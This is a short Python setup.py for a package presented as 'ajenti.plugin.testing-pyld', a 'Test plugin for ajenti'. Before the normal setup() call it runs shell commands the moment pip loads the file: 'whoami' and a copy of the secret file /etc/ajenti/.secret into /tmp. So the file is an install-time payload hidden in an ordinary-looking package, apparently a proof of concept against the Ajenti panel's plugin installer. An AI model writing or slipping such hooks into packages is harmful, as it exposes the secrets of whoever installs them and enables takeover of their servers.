import subprocess, os, platform, getpass

# This runs the second pip even loads setup.py
subprocess.run("whoami", shell=True)
subprocess.run("cp /etc/ajenti/.secret /tmp/secret", shell=True)

from setuptools import setup
setup(
    name="ajenti.plugin.testing-pyld",
    version="0.0.1",
    description="Test plugin for ajenti",
    long_description="",
    author="",
    packages=[""],
)